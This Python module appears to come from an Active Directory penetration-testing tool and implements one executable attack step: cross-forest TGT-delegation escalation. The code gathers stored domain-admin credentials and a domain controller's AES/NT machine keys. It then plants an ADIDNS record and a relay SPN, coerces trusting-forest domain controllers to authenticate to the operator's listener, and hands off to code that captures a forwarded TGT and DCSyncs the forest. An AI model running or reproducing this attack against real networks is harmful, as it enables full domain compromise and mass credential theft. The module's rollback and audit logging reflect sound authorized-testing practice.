"""Attack-step wiring for cross-org TGT-delegation escalation (executor seam).

This is the executor-facing half of the cross-forest cross-org TGT-delegation
feature. The modeled ``CrossOrgTgtDelegation`` edge (added by
``attack_graph_core.couple_cross_org_tgt_delegation_edges``) fires here: this
module gathers the runtime parameters from the compromised trusted forest's
state and hands them to the pure consumer ``execute_cross_org_tgt_delegation``.

Split of responsibility (single-responsibility, testable):

* ``services/relay/kerberos_coercion_capture.py`` — the reusable coerce+capture
  primitive (no decode, no forward).
* ``services/cross_forest_tgt_delegation.py`` — the consumer: decode the AP-REQ,
  extract the forwarded TGT, DCSync the trusting forest. Takes explicit params.
* THIS module — the executor seam: resolve those params from ``shell`` state
  (DC IPs via the DC-inventory SSOT, the trusted DC's machine-account AES keys
  from the credential store, the ADIDNS writer credential, the listener host)
  and call the consumer.

Why the split: the consumer stays a pure, L1-testable orchestration with no
knowledge of ``domains_data`` layout; the param-gathering that DOES know the
workspace layout lives here and is mocked at its boundary in tests. The live
coerce/decode/DCSync is L3 (DarkZero).

Design: docs/superpowers/specs/2026-08-03-kerberos-coercion-capture-module.md
"""

from __future__ import annotations

import secrets
from typing import Any

from adscan_core import telemetry
from adscan_core.rich_output import (
    print_exception,
    print_info,
    print_info_debug,
    print_warning,
)
from adscan_internal.models.domain import (
    resolve_dc_ip,
    resolve_dns_server,
    resolve_domain_controllers,
)
from adscan_internal.rich_output import mark_sensitive
from adscan_internal.services.adidns import ADIDNSConfig
from adscan_internal.services.adspn import ADSPNConfig, adspn_scope
from adscan_internal.services.credential_store_service import (
    CredentialStoreService,
    get_stored_domain_credential_for_user,
)
from adscan_internal.services.cross_forest_tgt_delegation import (
    CrossOrgTgtDelegationResult,
    execute_cross_org_tgt_delegation,
)


def _classify_secret(secret: str) -> tuple[str | None, str | None, str | None]:
    """Return ``(password, nt_hash, ccache_path)`` for a credential.

    A single credential slot may carry any of the three: a ``.ccache`` path, a
    32-hex NT hash (pass-the-hash), or a cleartext password. Reuses the canonical
    detectors so the classification stays single-source (mirrors
    ``spnjack_executor._classify_secret``). A real engagement often holds only the
    DA NT hash, so both the ADIDNS write and the SPN write must accept a hash.
    """
    value = str(secret or "").strip()
    if not value:
        return None, None, None
    from adscan_internal.services.ldap_transport_service import _is_nt_hash
    from adscan_internal.services.pivot_auth_context_service import _looks_like_ccache

    if _looks_like_ccache(value):
        return None, None, value
    if _is_nt_hash(value):
        return None, value, None
    return value, None, None


def _register_env_change(shell: Any, **kwargs: Any) -> None:
    """Best-effort audit entry in the environment-change ledger (rollback)."""
    try:
        ledger = getattr(shell, "environment_change_ledger", None)
        if ledger is None:
            return
        ledger.register_change(**kwargs)
    except Exception as exc:  # noqa: BLE001 - audit is best-effort
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

# Preferred writer principals (in the compromised TRUSTED forest) for the ADIDNS
# A-record bind, most-privileged first. We hold at least one after compromising
# that forest; the resolver falls back to any owned credential.
_WRITER_CANDIDATES = ("Administrator", "administrator")


def _hex_to_bytes(value: str | None) -> bytes | None:
    """Decode a hex key string to bytes, or ``None`` when absent/invalid."""
    candidate = str(value or "").strip()
    if not candidate:
        return None
    try:
        return bytes.fromhex(candidate)
    except ValueError:
        return None


def _trusted_dc_identity(domain_data: dict) -> tuple[str, str] | None:
    """Return ``(short_hostname, machine_account_username)`` for the trusted DC.

    The trusted forest's DC machine account is the SPN whose key we hold (from
    DCSyncing that forest). Its short hostname is the DNS-prefix the coerced
    trusting DC canonicalizes the relay alias to (``cifs/<short>.<trusted>``).
    """
    hostname = str(
        domain_data.get("pdc_hostname_fqdn")
        or domain_data.get("pdc_hostname")
        or domain_data.get("dc_fqdn")
        or ""
    ).strip()
    if not hostname:
        return None
    short = hostname.split(".", 1)[0]
    if not short:
        return None
    return short, f"{short}$"


def _resolve_service_keys(
    shell: Any,
    *,
    service_domain: str,
    machine_username: str,
) -> tuple[list[tuple[int, bytes]] | None, str, str]:
    """Resolve ``(service_keys, service_password, service_nt_hash)`` AES-first.

    Prefers the AES key set we already hold for the trusted DC's machine account
    (from DCSyncing that forest — AES is NOT derivable from the NT hash). Returns
    the pre-computed ``(etype, key)`` pairs when available; otherwise leaves the
    NT hash for the consumer's RC4-only fallback.
    """
    store = CredentialStoreService()
    material = store.get_kerberos_key_material(
        domains_data=getattr(shell, "domains_data", {}),
        domain=service_domain,
        username=machine_username,
    )
    keys: list[tuple[int, bytes]] = []
    nt_hash = ""
    if material is not None:
        aes256 = _hex_to_bytes(material.aes256)
        aes128 = _hex_to_bytes(material.aes128)
        if aes256:
            keys.append((18, aes256))  # AES256-CTS-HMAC-SHA1-96
        if aes128:
            keys.append((17, aes128))  # AES128-CTS-HMAC-SHA1-96
        nt_hash = str(material.nt_hash or "")
        if nt_hash and not keys:
            rc4 = _hex_to_bytes(nt_hash)
            if rc4:
                keys.append((23, rc4))  # RC4-HMAC (last resort — no AES)
    return (keys or None), "", nt_hash


def _resolve_writer_credential(
    shell: Any, *, service_domain: str
) -> tuple[str, str] | None:
    """Return ``(username, secret)`` to bind ADIDNS in the compromised forest.

    We must be able to write an A record in the trusted forest's DNS. After
    compromising that forest we hold a domain-admin credential; pick the most
    privileged available, else any owned principal.
    """
    domains_data = getattr(shell, "domains_data", {})
    for candidate in _WRITER_CANDIDATES:
        secret = get_stored_domain_credential_for_user(
            domains_data, domain=service_domain, username=candidate
        )
        if secret:
            return candidate, secret
    domain_data = domains_data.get(service_domain, {}) or {}
    credentials = domain_data.get("credentials", {})
    if isinstance(credentials, dict):
        for username in credentials:
            secret = get_stored_domain_credential_for_user(
                domains_data, domain=service_domain, username=str(username)
            )
            if secret:
                return str(username), secret
    return None


def _resolve_listener_host(shell: Any, coerce_dc_ip: str) -> str:
    """Our reachable IP the relay alias points at and the listener binds on."""
    candidate = str(getattr(shell, "myip", "") or "").strip()
    if candidate:
        return candidate
    import socket

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.connect((coerce_dc_ip, 445))
            return str(sock.getsockname()[0])
    except OSError:
        return ""


async def run_cross_org_tgt_delegation_step(
    shell: Any,
    *,
    trusting_domain: str,
    service_domain: str,
    workspace_dir: str,
    capture_timeout: float = 120.0,
) -> CrossOrgTgtDelegationResult:
    """Resolve runtime params and run the cross-org TGT-delegation escalation.

    Args:
        shell: The active PentestShell (source of ``domains_data`` + ``myip``).
        trusting_domain: The forest we escalate INTO (DCSync target).
        service_domain: The compromised TRUSTED forest whose DC machine-account
            key decrypts the AP-REQ and whose DNS we write the alias into.
        workspace_dir: Where the captured ccache is written.
        capture_timeout: Seconds to wait for the coerced authentication.

    Best-effort — never raises; returns the consumer's typed result. The live
    coerce/decode/DCSync is validated at L3 (DarkZero).
    """
    def _abort(error: str) -> CrossOrgTgtDelegationResult:
        """Return a failed result AND log its reason to the debug sink.

        Without this, an early-return capability gap ("no key material for the
        trusted DC machine account") looked like "nothing happened" in the log.
        Kept at debug level and vendor-neutral (a technique-narrative surface).
        """
        print_info_debug(
            "cross-org TGT delegation: step did not run: "
            f"trusting={mark_sensitive(trusting_domain, 'domain')} "
            f"service={mark_sensitive(service_domain, 'domain')} reason={error}"
        )
        return CrossOrgTgtDelegationResult(success=False, error=error)

    domains_data = getattr(shell, "domains_data", {})

    def _domain_data_ci(name: str) -> dict[str, Any]:
        """Resolve ``domains_data[name]`` case-insensitively.

        The attack-path edge labels are UPPERCASE (``DARKZERO.HTB``) while the
        ``domains_data`` keys are the collected lowercase FQDN (``darkzero.htb``).
        A direct ``.get(UPPERCASE)`` misses, so the DC IP looks unresolved even
        though it is present — the ``no DC IP resolved for the trusting forest``
        abort on a workspace that DOES hold the trusting DC. Match by
        casefold so either casing resolves the real record.
        """
        if not isinstance(domains_data, dict):
            return {}
        direct = domains_data.get(name)
        if isinstance(direct, dict):
            return direct
        target = str(name or "").strip().casefold()
        for key, value in domains_data.items():
            if str(key or "").strip().casefold() == target and isinstance(value, dict):
                return value
        return {}

    trusting_data = _domain_data_ci(trusting_domain)
    trusted_data = _domain_data_ci(service_domain)

    trusted_dc_ip = resolve_dc_ip(trusted_data) or ""
    if not trusted_dc_ip:
        return _abort(
            f"no DC IP resolved for the compromised forest {service_domain}"
        )

    # The trusting forest may have MULTIPLE DCs; any reachable one can be coerced.
    # Build an ordered candidate list (the primary DC first) so a single
    # unreachable / non-resolving DC does not abort the whole step.
    coerce_dc_candidates = _resolve_coerce_dc_candidates(trusting_data)
    if not coerce_dc_candidates:
        return _abort(f"no DC IP resolved for the trusting forest {trusting_domain}")

    identity = _trusted_dc_identity(trusted_data)
    if identity is None:
        return _abort(
            f"could not resolve the trusted DC hostname for {service_domain}"
        )
    trusted_short, machine_username = identity

    # GATE: this step's precondition is a prior DCSync of the trusted forest, which
    # now extracts machine-account keys — so we normally HOLD the trusted DC's key.
    # Verify it (case-insensitive) before writing anything; abort honestly if absent.
    service_keys, service_password, service_nt_hash = _resolve_service_keys(
        shell, service_domain=service_domain, machine_username=machine_username
    )
    if not service_keys and not service_password and not service_nt_hash:
        return _abort(
            f"no Kerberos key material held for {machine_username} in "
            f"{service_domain} — DCSync the trusted forest first to obtain the "
            "AES key set for its DC machine account"
        )

    writer = _resolve_writer_credential(shell, service_domain=service_domain)
    if writer is None:
        return _abort(
            f"no writer credential held in {service_domain} to add the ADIDNS "
            "alias record (a domain-admin credential is required)"
        )
    writer_user, writer_secret = writer
    writer_password, writer_nt_hash, writer_ccache = _classify_secret(writer_secret)

    # A FRESH alias that does NOT already exist in the trusted zone. Reusing the
    # trusted DC's own FQDN (dc02.<zone>) made the ADIDNS write APPEND a second A
    # record to the real DC's node, so the coerced DC resolved the alias round-robin
    # to the real DC and the callback never reached us. A unique label takes the
    # authoritative ``created dnsNode`` path — it resolves ONLY to our listener.
    relay_alias_hostname = f"adscanrelay{secrets.token_hex(4)}"
    alias_fqdn = f"{relay_alias_hostname}.{service_domain}"
    # The coerced DC must request an SPN whose key we hold, so it authenticates over
    # KERBEROS (carrying the forwarded TGT), not NTLM. Write ``host/<alias>`` onto
    # the trusted DC machine account (whose key we hold) — this maps the fresh alias
    # to that key. The decryption identity (service_hostname/service_keys) is
    # UNCHANGED; only the name the DC is pointed at, and its SPN mapping, are new.
    relay_spn = f"host/{alias_fqdn}"

    adidns = ADIDNSConfig(
        dc_ip=trusted_dc_ip,
        domain=service_domain,
        username=writer_user,
        password=writer_password,
        nt_hash=writer_nt_hash,
        ccache_path=writer_ccache,
        use_kerberos=bool(writer_ccache),
        # Split-DC/DNS (issue #15): the trusted forest may serve its AD zone from
        # a separate DNS server; use it for the SOA-serial query. Absent -> DC.
        dns_server=resolve_dns_server(
            getattr(shell, "domains_data", {}).get(service_domain) or {}
        ),
    )
    spn_cfg = ADSPNConfig(
        dc_ip=trusted_dc_ip,
        domain=service_domain,
        username=writer_user,
        password=writer_password,
        nt_hash=writer_nt_hash,
        ccache_path=writer_ccache,
        use_kerberos=bool(writer_ccache),
    )

    # Write the relay SPN on the trusted DC machine account for the duration of the
    # coercion; the RAII scope removes it on exit (success OR failure). Register it
    # in the environment-change ledger so the durable AD mutation is auditable and
    # surfaces manual_required if the revert fails.
    try:
        async with adspn_scope(spn_cfg, relay_spn, machine_username):
            _register_env_change(
                shell,
                kind="spn_added",
                domain=service_domain,
                target=f"{machine_username} (relay SPN for cross-org TGT delegation)",
                detail={"spn": relay_spn, "alias_fqdn": alias_fqdn},
                method="cross_org_tgt_delegation",
            )
            _register_env_change(
                shell,
                kind="dns_record_added",
                domain=service_domain,
                target=f"ADIDNS A record {alias_fqdn}",
                detail={"alias_fqdn": alias_fqdn},
                method="cross_org_tgt_delegation",
            )
            result = await _coerce_over_candidates(
                shell,
                trusting_domain=trusting_domain,
                coerce_dc_candidates=coerce_dc_candidates,
                relay_alias_hostname=relay_alias_hostname,
                alias_fqdn=alias_fqdn,
                machine_username=machine_username,
                service_domain=service_domain,
                trusted_short=trusted_short,
                adidns=adidns,
                workspace_dir=workspace_dir,
                service_keys=service_keys,
                service_password=service_password,
                service_nt_hash=service_nt_hash,
                capture_timeout=capture_timeout,
            )
    except RuntimeError as exc:
        # adspn_scope raises when the SPN write is refused (insufficient rights).
        return _abort(
            f"could not add the relay SPN {relay_spn} on {machine_username}: {exc}"
        )

    if not result.success:
        print_warning(
            f"Cross-org TGT delegation did not complete: {result.error or 'unknown'}."
        )
    return result


def _resolve_coerce_dc_candidates(trusting_data: dict) -> list[str]:
    """Return an ordered list of trusting-forest DC IPs to coerce (primary first).

    A forest may run multiple DCs; any reachable one can be coerced. The primary
    (``resolve_dc_ip``) leads, then the alias-aware DC set fills in the rest so a
    single unreachable / non-resolving DC does not abort the whole step.
    """
    candidates: list[str] = []
    primary = resolve_dc_ip(trusting_data) or ""
    if primary:
        candidates.append(primary)
    try:
        from adscan_internal.models.domain import _looks_like_ipv4  # noqa: PLC0415

        dc_set = resolve_domain_controllers(trusting_data)
        for rec in getattr(dc_set, "dcs", ()) or ():
            for alias in getattr(rec, "aliases", ()) or ():
                ip_s = str(alias or "").strip()
                if ip_s and _looks_like_ipv4(ip_s) and ip_s not in candidates:
                    candidates.append(ip_s)
    except Exception:  # noqa: BLE001 - best-effort enrichment; primary already set
        pass
    return candidates


async def _coerce_over_candidates(
    shell: Any,
    *,
    trusting_domain: str,
    coerce_dc_candidates: list[str],
    relay_alias_hostname: str,
    alias_fqdn: str,
    machine_username: str,
    service_domain: str,
    trusted_short: str,
    adidns: ADIDNSConfig,
    workspace_dir: str,
    service_keys: Any,
    service_password: str,
    service_nt_hash: str,
    capture_timeout: float,
) -> CrossOrgTgtDelegationResult:
    """Try each trusting-forest DC candidate until the coercion capture succeeds."""
    last: CrossOrgTgtDelegationResult | None = None
    for coerce_dc_ip in coerce_dc_candidates:
        listener_host = _resolve_listener_host(shell, coerce_dc_ip)
        if not listener_host:
            last = CrossOrgTgtDelegationResult(
                success=False, error="could not determine a reachable listener host IP"
            )
            continue

        print_info(
            "Cross-org TGT delegation: coercing "
            f"{mark_sensitive(coerce_dc_ip, 'ip')} ({mark_sensitive(trusting_domain, 'domain')}) "
            f"to the relay alias {mark_sensitive(alias_fqdn, 'hostname')} "
            f"(SPN key: {mark_sensitive(machine_username, 'user')}@{mark_sensitive(service_domain, 'domain')})."
        )

        result = await execute_cross_org_tgt_delegation(
            shell,
            trusting_domain=trusting_domain,
            coerce_dc_ip=coerce_dc_ip,
            listener_host=listener_host,
            relay_alias_hostname=relay_alias_hostname,
            service_domain=service_domain,
            service_hostname=trusted_short,
            adidns=adidns,
            workspace_dir=workspace_dir,
            service_keys=service_keys,
            service_password=service_password,
            service_nt_hash=service_nt_hash,
            capture_timeout=capture_timeout,
        )
        if result.success:
            return result
        last = result
    return last or CrossOrgTgtDelegationResult(
        success=False, error="no trusting-forest DC could be coerced"
    )


__all__ = ["run_cross_org_tgt_delegation_step"]
